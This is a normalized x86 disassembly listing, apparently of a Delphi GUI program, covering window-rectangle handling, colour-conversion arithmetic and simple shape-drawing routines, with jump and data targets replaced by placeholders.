mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46a1ec
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_466fec
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44894c
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448af0
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_467c38
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_44604c
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f50
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44a198
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46a340
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448ac4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448ac4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44914c
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_467d84
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46a3a0
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_469fbc
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_469fbc
jmp r-xdata
sub_46a7e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f0c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f0c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46a81c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44a198
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44a198
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_455d30
sub_46a8ac
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46a8d4
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46a978
add [ eax ] eax
add [ eax ] al
pop esp
mov esi 0x55000048
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46a9db
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9e2
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_460350
mov eax sub_4605d0
call sub_4180a8
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46aa28
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
call sub_405ee4
cmp ebx [ eax + 0x10 ]
jne r-xdata
mov eax ebx
call sub_406b70
mov esi eax
and esi 0xff
mov eax ebx
call sub_406b74
mov edi eax
and edi 0xff
mov eax ebx
call sub_406b78
and eax 0xff
mov [ ebp - 0x22 ] ax
movzx edx di
movzx eax si
call sub_42ba68
movzx edx [ ebp - 0x22 ]
call sub_42ba68
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fstp [ ebp - 0x30 ]
fwait
movzx edx di
movzx eax si
call sub_42ba60
movzx edx [ ebp - 0x22 ]
call sub_42ba60
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fstp [ ebp - 0x38 ]
fwait
fld [ ebp - 0x30 ]
fadd [ ebp - 0x38 ]
fmul [ r-xdata ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x30 ]
fcomp [ ebp - 0x38 ]
fnstsw ax
sahf
jne r-xdata
call sub_405ee4
mov ax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] ax
call sub_405ee4
mov ax [ eax + 0x16 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
call sub_405ee4
mov ax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
jmp r-xdata
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa0
fld [ ebp - 0x18 ]
call sub_40292c
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fmul [ r-xdata ]
fld [ r-xdata ]
fsub [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ r-xdata ]
fsub [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fadd [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fadd [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x20 ]
fwait
jmp r-xdata
call sub_405ee4
mov [ eax + 0x10 ] ebx
call sub_405ee4
mov edx [ ebp - 0x4 ]
mov dx [ edx ]
mov [ eax + 0x14 ] dx
call sub_405ee4
mov edx [ ebp - 0x8 ]
mov dx [ edx ]
mov [ eax + 0x16 ] dx
call sub_405ee4
mov edx [ ebp + 0x8 ]
mov dx [ edx ]
mov [ eax + 0x18 ] dx
movzx eax di
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fcomp [ ebp - 0x30 ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x68 ]
fld [ ebp - 0x58 ]
fsubp st1
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
movzx eax si
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fsubr [ ebp - 0x30 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x48 ]
fwait
movzx eax di
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fsubr [ ebp - 0x30 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x58 ]
fwait
movzx eax [ ebp - 0x22 ]
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fsubr [ ebp - 0x30 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x68 ]
fwait
movzx eax si
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fcomp [ ebp - 0x30 ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x58 ]
fadd [ r-xdata ]
fld [ ebp - 0x48 ]
fsubp st1
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x48 ]
fadd [ r-xdata ]
fld [ ebp - 0x68 ]
fsubp st1
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp - 0x10 ]
fadd [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x10 ]
call sub_40292c
mov edx [ ebp - 0x4 ]
mov [ edx ] ax
fld [ ebp - 0x18 ]
call sub_40292c
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
fld [ ebp - 0x20 ]
call sub_40292c
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
fld [ ebp - 0x10 ]
fsub [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
sub_46ad48
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp + 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x8 ]
fsub [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
fmul [ ebp + 0x8 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fadd [ ebp + 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
call sub_40292c
pop ecx
pop ecx
pop ebp
retn 0x18
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
fld [ r-xdata ]
fsub [ ebp + 0x8 ]
fmulp st1
fadd [ r-xdata ]
fdiv [ r-xdata ]
fadd [ ebp + 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_46ae34
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp + 0x8 ]
call sub_40292c
mov eax 0xff
jmp r-xdata
pop ebp
retn 0x8
sub_46ae5c
push ebx
push esi
push edi
add esp 0xffffffd0
mov esi eax
test cx cx
jne r-xdata
movzx eax dx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
movzx eax dx
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x14 ] eax
movzx eax si
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jmp r-xdata
movzx eax dx
mov edi eax
movzx ebx cx
add edi ebx
mov [ esp + 0x28 ] edi
fild [ esp + 0x28 ]
imul eax ebx
mov [ esp + 0x2c ] eax
fild [ esp + 0x2c ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fsubp st1
fstp [ esp + 0x20 ]
fwait
movzx eax dx
movzx ecx cx
add ecx 0xf0
imul eax ecx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp + 0x20 ]
fwait
jmp r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_46ae34
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_46ae34
push eax
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_46ae34
pop edx
pop ecx
call sub_406b54
add esp 0x30
pop edi
pop esi
pop ebx
retn
movzx eax dx
add eax eax
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fsub [ esp + 0x20 ]
fstp [ esp + 0x18 ]
fwait
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ esp + 0x2c ]
movzx eax si
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_46ad48
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ esp + 0x2c ]
movzx eax si
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_46ad48
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp + 0x8 ]
fwait
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ esp + 0x2c ]
movzx eax si
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
fsub [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_46ad48
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp + 0x10 ]
fwait
sub_46b06c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
call sub_405ee4
cmp ebx [ eax + 0x34 ]
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_423dac
lea ecx [ esp + 0x6 ]
lea edx [ esp + 0x4 ]
call sub_46aa28
mov dx [ esp + 0x2 ]
add dx si
mov cx [ esp + 0x4 ]
mov ax [ esp ]
call sub_46ae5c
mov edi eax
call sub_405ee4
mov [ eax + 0x34 ] ebx
call sub_405ee4
mov [ eax + 0x38 ] esi
call sub_405ee4
mov [ eax + 0x3c ] edi
call sub_405ee4
cmp esi [ eax + 0x38 ]
jne r-xdata
call sub_405ee4
mov edi [ eax + 0x3c ]
jmp r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_46b0f8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
call sub_405ee4
cmp esi [ eax + 0x20 ]
jne r-xdata
cmp esi 0xff00000f
jne r-xdata
call sub_405ee4
cmp ebx [ eax + 0x1c ]
jne r-xdata
mov eax esi
call sub_423dac
mov edi eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x6 ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_46aa28
cmp [ esp + 0x4 ] 0xdc
jbe r-xdata
cmp ebx 0x13
jne r-xdata
call sub_405ee4
mov edi [ eax + 0x24 ]
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
call sub_46b06c
mov edi eax
mov dx [ esp + 0x2 ]
sub dx bx
mov cx [ esp + 0x4 ]
mov ax [ esp ]
call sub_46ae5c
mov edi eax
jmp r-xdata
mov edi 0xff000014
jmp r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
call sub_405ee4
mov [ eax + 0x1c ] ebx
call sub_405ee4
mov [ eax + 0x20 ] esi
call sub_405ee4
mov [ eax + 0x24 ] edi
sub_46b1b8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
call sub_405ee4
cmp esi [ eax + 0x2c ]
jne r-xdata
cmp esi 0xff00000f
jne r-xdata
call sub_405ee4
cmp ebx [ eax + 0x28 ]
jne r-xdata
mov eax esi
call sub_423dac
mov edi eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x6 ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_46aa28
cmp [ esp + 0x4 ] 0xa0
jb r-xdata
cmp ebx 0xffffffce
jne r-xdata
call sub_405ee4
mov edi [ eax + 0x30 ]
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
call sub_46b06c
mov edi eax
mov dx [ esp + 0x2 ]
add dx bx
mov cx [ esp + 0x4 ]
mov ax [ esp ]
call sub_46ae5c
mov edi eax
jmp r-xdata
mov edi 0xff000010
jmp r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
call sub_405ee4
mov [ eax + 0x28 ] ebx
call sub_405ee4
mov [ eax + 0x2c ] esi
call sub_405ee4
mov [ eax + 0x30 ] edi
sub_46b278
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x14 ]
call sub_424a30
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x10 ]
call sub_424750
mov edx eax
mov eax [ edi + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x24 ]
xor eax eax
mov al bl
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
mov ecx 0x18
call sub_4028c8
mov esi 0x3
lea ebx [ ebp - 0x24 ]
lea ecx [ ebp - 0x2c ]
mov edx [ ebx + 0x4 ]
imul edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov eax [ ebx ]
imul eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
call sub_417088
mov eax [ ebp - 0x2c ]
mov [ ebx ] eax
mov eax [ ebp - 0x28 ]
mov [ ebx + 0x4 ] eax
add ebx 0x8
dec esi
jne r-xdata
mov eax [ edi + 0x10 ]
call sub_42485c
mov ebx eax
mov eax [ edi + 0x10 ]
mov edx 0x1
call sub_424864
lea edx [ ebp - 0x24 ]
mov ecx 0x2
mov eax edi
call sub_424f70
mov eax [ edi + 0x10 ]
mov edx ebx
call sub_424864
mov eax [ edi + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_424a38
sub_46b344
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x1 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
mov ecx 0x18
call sub_4028c8
mov esi 0x3
lea ebx [ ebp - 0x18 ]
mov edx [ edi ]
imul edx [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x5 ]
mov eax [ edi ]
imul eax [ ebx ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx - 0x9 ]
lea ecx [ ebp - 0x20 ]
call sub_417088
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1c ]
mov [ ebx + 0x4 ] eax
add ebx 0x8
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x1 ]
sub al 0x1
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebp - 0x8 ]
inc eax
call sub_417088
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
je r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebp - 0x8 ]
dec eax
call sub_417088
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ecx 0x2
call sub_424fa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
dec edx
mov eax [ ebp - 0x8 ]
inc eax
call sub_417088
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_46b430
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
call sub_42485c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424864
mov al [ ebp - 0x1 ]
sub al 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x9 ] eax
push ebp
call sub_46b344
pop ecx
inc [ ebp - 0x9 ]
push ebp
call sub_46b344
pop ecx
add [ ebp - 0x9 ] 0x3
push ebp
call sub_46b344
pop ecx
inc [ ebp - 0x9 ]
push ebp
call sub_46b344
pop ecx
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_424864
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x5 ] eax
push ebp
call sub_46b344
pop ecx
inc [ ebp - 0x5 ]
push ebp
call sub_46b344
pop ecx
add [ ebp - 0x5 ] 0x3
push ebp
call sub_46b344
pop ecx
inc [ ebp - 0x5 ]
push ebp
call sub_46b344
pop ecx
jmp r-xdata
sub_46b4ec
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424b88
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46b73c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx 0x1
call sub_424864
lea ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417088
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x38 ] eax
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx ebx
mov eax [ ebp - 0x8 ]
add eax ebx
call sub_417088
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x4 ]
sub edx ebx
mov edi ebx
add edi edi
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
call sub_417088
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x4 ]
sub edx ebx
dec edx
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
call sub_417088
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x4 ]
add edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax ebx
call sub_417088
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x4 ]
sub edx 0x2
mov eax [ ebp - 0x8 ]
dec eax
call sub_417088
mov eax [ ebp - 0x6c ]
